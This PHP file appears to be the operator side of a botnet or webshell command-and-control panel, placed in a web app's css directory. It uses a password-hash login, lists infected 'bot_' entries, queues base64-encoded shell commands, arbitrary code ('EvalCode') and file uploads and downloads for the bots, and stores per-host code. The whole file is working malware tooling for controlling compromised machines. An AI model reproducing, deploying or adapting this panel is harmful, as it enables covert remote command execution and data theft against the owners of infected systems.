<?php
define('WorkPath', '/opt/app-root/src/app/webroot/css/');
define('WaitTimeout', 28);
define('WaitSetp', 10000);
date_default_timezone_set('ETC/GMT-8');
set_time_limit(0);
if (PHP_VERSION < 6) {
	if (get_magic_quotes_gpc()) {
		function stripslashesDeep($var) {return is_array($var) ? array_map('stripslashesDeep', $var) : stripslashes($var);}
		$_POST = stripslashesDeep($_POST);
	}
}
session_start();
if (isset($_POST['Login'])) {
	if (substr(@md5($_POST['Login']), 8, 8) === '36302540') {
		$_SESSION['Haslogged'] = 1;
		ReturnExit();
	}
}
if (!isset($_SESSION['Haslogged'])) {
	die('Access denied');
}
session_write_close();


if (!@is_dir(WorkPath)) {
	ReturnError('!WorkPath');
}

if (isset($_POST['do'])) {
	switch ($_POST['do']) {
		case 'List':{
			$Bots = array();
			$Dir = @dir(WorkPath);
			while (($file = $Dir->read()) !== false){
				if (substr($file, 0, 4) == 'bot_') {
					$BotFile = WorkPath.$file;
					$info = @unserialize(fReadContent($BotFile));
					unset($info['download_task']);
					unset($info['upload_task']);
					$Bots[] = array('hash'=>substr($file, 4), 'file'=>$BotFile, 'info'=>$info, 'time'=>date('Y-m-d H:i:s', filemtime($BotFile)), 'active'=>strtotime('now') - filemtime($BotFile));
				}
			}
			ReturnExit(array('A'=>1, 'D'=>$Bots, 'Now'=>date('Y-m-d H:i:s', time())));
		}break;
		case 'Del':{
			@unlink(WorkPath.'bot_'.$_POST['hash']);
			@unlink(WorkPath.'swp_'.$_POST['hash']);
			@unlink(WorkPath.'ret_'.$_POST['hash']);
			@unlink(WorkPath.'upl_'.$_POST['hash']);
			@unlink(WorkPath.'dow_'.$_POST['hash']);
			ReturnExit();
		}break;
		case 'HostCode':
			ShowHSC();
		break;
		case 'SaveCode':{
			$D = @unserialize(fReadContent(WorkPath.'Hosts'));
			if (!$D) $D = array();
			$D[$_POST['host']] = $_POST['Code'];
			fWriteContent(WorkPath.'Hosts', serialize($D));
			ShowHSC();
		}break;
		case 'DelCode':{
			$D = @unserialize(fReadContent(WorkPath.'Hosts'));
			if (!$D) ReturnExit();
			$S = array();
			foreach ($D as $key => $value) {
				($key != $_POST['host']) && ($S[$key] = $value);
			}
			fWriteContent(WorkPath.'Hosts', @serialize($S));
			ShowHSC();
		}break;
		default:
			break;
	}
	ReturnExit();
}

$BotHash = @$_POST['hash'];

if (strlen($BotHash) == 0)
	ReturnError('!hash');

$BotFile = WorkPath.'bot_'.$BotHash;
$RetFile = WorkPath.'ret_'.$BotHash;

if (!file_exists($BotFile))
	ReturnError('!exists botfile');

$Action = $_POST['act'];

if (strlen($Action) == 0)
	ReturnError('!action');

$BotInfo = @unserialize(fReadContent($BotFile));
if (empty($BotInfo))
	ReturnError('!read botfile');


$SWPData = '';
switch ($Action){
	case 'get':
		WaitResult();
		break;
	case 'command':
		$SWPData = ExecCommand();
		break;
	case 'upload':
		$SWPData = Upload();
		break;
	case 'ClearUpload':
		@unlink($BotInfo['upload_task']);
		$SWPData = '2'.randStr(3);
		break;
	case 'download':
		Download();
		break;
	case 'CheckDownload':
		$SWPData = CheckDownload();
		break;
	case 'ClearDownload':
		@unlink($BotInfo['download_task']);
		break;
	case 'EvalCode':
		$SWPData = '4'.@$_POST['Code'];
		break;
	default:
		ReturnError('UNKOWN Action');
}

if (!empty($SWPData)){
	if (!fWriteContent(WorkPath.'swp_'.$BotHash, $BotInfo['bgFlag'].base64_encode($SWPData).$BotInfo['edFlag']))
		ReturnError('!WriteContent SWP');
}
ReturnExit();
function ShowHSC(){
	$D = @unserialize(fReadContent(WorkPath.'Hosts'));
	if (!$D) ReturnExit();
	ReturnExit(array('A'=>1, 'D'=>$D));
}
function WaitResult()
{
	global $RetFile, $BotInfo;
	$Start = strtotime('now');
	for ($i = 0; (strtotime('now') - $Start) < WaitTimeout ; $i++){
		if (file_exists($RetFile)){
			$RetVal = fReadContent($RetFile);
			@unlink($RetFile);
			switch (intval($RetVal[0])){
				case 0:ReturnExit();					
					break;
				case 1:
					ReturnExit(array('A'=>1, 'R'=>substr($RetVal, 1)));
					break;
				case 2:{
					if (!file_exists($BotInfo['upload_task']))
						break;
					$F = @unserialize(fReadContent($BotInfo['upload_task']));
					if (!$F)break;
					$F['A'] = 2;
					$S = substr($RetVal, 1, 1);
					if ($S == '!') {
						$F['Done'] = 1;
						fWriteContent($BotInfo['upload_task'], serialize($F));
						$F['state'] = 1;
						ReturnExit($F);
					}elseif($S == '@'){
						$F['Done'] = 2;
						fWriteContent($BotInfo['upload_task'], serialize($F));
						$F['state'] = 2;
						ReturnExit($F);
					}elseif($S == '#' && $F['TotalBytes'] == 0){
						$F['TotalBytes'] = intval(substr($RetVal, 2));
						fWriteContent($BotInfo['upload_task'], serialize($F));
						ReturnExit($F);
					}
				}
					break;
				case 3:{
					if (!file_exists($BotInfo['download_task']))
						break;
					$F = @unserialize(fReadContent($BotInfo['download_task']));
					if (!$F)break;
					$F['A'] = 3;
					$S = substr($RetVal, 1);
					if ($S == '!') {
						$F['Done'] = 1;
						fWriteContent($BotInfo['download_task'], serialize($F));						
						$F['state'] = 1;
						ReturnExit($F);
					}elseif ($S[0] == 'F'){
						$F['state'] = ($F['TotalBytes'] == intval(substr($RetVal, 2))) ? 2 : 1;
						ReturnExit($F);
					}
				}
					break;
				case 4:
					ReturnExit(array('A'=>6, 'R'=>substr($RetVal, 1)));
					break;
				default:Error('UNKOWN ID');
			}
			ReturnExit();
		}
		($i % 2) && FileTrasfer();
		usleep(WaitSetp);
	}
	ReturnExit();
}

function ExecCommand()
{
	$Paramer = getParamers($_POST, array('CD', 'CDL', 'Output', 'Argument'));
	if (count($Paramer) != 4)
		ReturnError();

	return '1' . (intval($Paramer['Output']) > 0 ? '1' : '0') . sprintf('%02d', $Paramer['CDL']) . $Paramer['CD'] . $Paramer['Argument'];
}
function FileTrasfer(){
	global $BotInfo;
	$D = array();
	if (file_exists($BotInfo['download_task'])){
		$F = @unserialize(fReadContent($BotInfo['download_task']));
		if ($F && $F['Postion'] != $F['WK']) {
			$F['WK'] = $F['Postion'];
			fWriteContent($BotInfo['download_task'], serialize($F));
			$F['state'] = 0;
			$D['DN'] = $F;
		}
	}
	if (file_exists($BotInfo['upload_task'])) {
		$F = @unserialize(fReadContent($BotInfo['upload_task']));
		if ($F){
			@clearstatcache($F['Dest']);
			$S = @filesize($F['Dest']);
			if ($S != $F['WK']){
				$F['WK'] = $S;
				if ($S == $F['TotalBytes']) $F['Done'] = 1; 
				fWriteContent($BotInfo['upload_task'], serialize($F));
				$F['state'] = $F['Done'] ? 3 : 0;
				$D['UP'] = $F;
			}
		}
	}
	
	if (count($D) > 0) {
		$D['A'] = 4;
		ReturnExit($D);
	}
}
function Upload(){
	global $BotInfo;
	$Paramer = getParamers($_POST, array('blockSize', 'Source', 'Dest'));
	if (count($Paramer) != 3)
		ReturnError();

	if (file_exists($Paramer['Dest']))
		ReturnError('[ ' . $Paramer['Dest'] . ' ] already exist on the server');

	fWriteContent($BotInfo['upload_task'], serialize(array('File'=>$Paramer['Source'], 'Dest'=>$Paramer['Dest'], 'Done'=>0, 'TotalBytes'=>0, 'WK'=>0, 'rSize'=>intval($Paramer['blockSize']))));

	return '2'.json_encode(array('SRC' => $Paramer['Source'], 'BLK'=>intval($Paramer['blockSize'])));
}
function CheckDownload(){
	if (!isset($_POST['Dst'])) {
		ReturnError('unset check download file');
	}
	return '3'.randStr(3).json_encode(array('Dst' => $_POST['Dst'], 'VS'=>1));
}
function Download(){
	global $BotInfo;
	$Paramer = getParamers($_POST, array('blockSize', 'Source', 'Dest'));
	if (count($Paramer) != 3)
		ReturnError();

	$FileSize = @filesize($Paramer['Source']);
	if (!$FileSize)
		ReturnError();
	
	$endFlag = randStr(4);
	do{
		$T = randStr(1,1);
		if ($endFlag.$T != $BotInfo['edFlag']) {
			$endFlag .= $T;
			break;
		}
	}while(1);
	fWriteContent($BotInfo['download_task'], serialize(array('File'=>$Paramer['Source'], 'TotalBytes'=>$FileSize, 'Dest'=>$Paramer['Dest'], 'Done'=>0, 'rSize'=>intval($Paramer['blockSize']), 'Postion'=>0, 'EDF'=>$endFlag, 'WK'=>0)));
}
function ReturnExit($d = false){
	if (is_array($d)) {
		echo json_encode($d);die();
	}else{
		echo json_encode(array('A'=>0));die();
	}
}
function ReturnError($msg = 'unkown'){
	die(json_encode(array('A'=>5, 'msg'=>$msg)));
}
function getParamers(&$raw, $name)
{	
	if (is_array($name))
	{
		foreach ($name as $value)
		{
			isset($raw[$value]) && ($ret[$value] = trim($raw[$value]));
		}
		return $ret;
	}
	else 
		return trim($raw[$name]);
}
function randStr($len, $Nf=0){ 
	$chars = !$Nf ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz' : '*-.';
	$string = ''; 
	for(; $len >= 1; $len--){
		$position = rand()%strlen($chars);
		$string .= substr($chars,$position,1); 
	}
	return $string; 
}
function fReadContent($f){
	return @file_get_contents($f);
	/*
	$handle = fopen($f, 'r');
	if(!$handle)
		return '';
	$content = '';	
	if (flock($handle, LOCK_EX)) {
		@clearstatcache($f);
		$content = @fread($handle, @filesize($f));
		flock($handle, LOCK_UN);
	}
	fclose($handle);
	return $content;
	*/
}
function fWriteContent($f, $d){
	return @file_put_contents($f, $d);
	/*
	$handle = fopen($f, 'w');
	if(!$handle)
		return false;
	$WD = false;
	if (flock($handle, LOCK_EX)) {
		$WD = fwrite($handle, $d);
		flock($handle, LOCK_UN);
	}
	fclose($handle);
	return $WD;
	*/
}
/*
//php <= 5.1
if (!function_exists('json_encode')){
  function json_encode($a=false){
    if (is_null($a)) return 'null';
    if ($a === false) return 'false';
    if ($a === true) return 'true';
    if (is_scalar($a)){
      if (is_float($a)){
        return floatval(str_replace(",", ".", strval($a)));
      }
      if (is_string($a)){
        static $jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
        return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
      }else return $a;
    }
    $isList = true;
    for ($i = 0, reset($a); $i < count($a); $i++, next($a)) {
      if (key($a) !== $i){
        $isList = false;
        break;
      }
    }
    $result = array();
    if ($isList){
      foreach ($a as $v) $result[] = json_encode($v);
      return '[' . join(',', $result) . ']';
    }else{
      foreach ($a as $k => $v) $result[] = json_encode($k).':'.json_encode($v);
      return '{' . join(',', $result) . '}';
    }
  }
}
*/
?>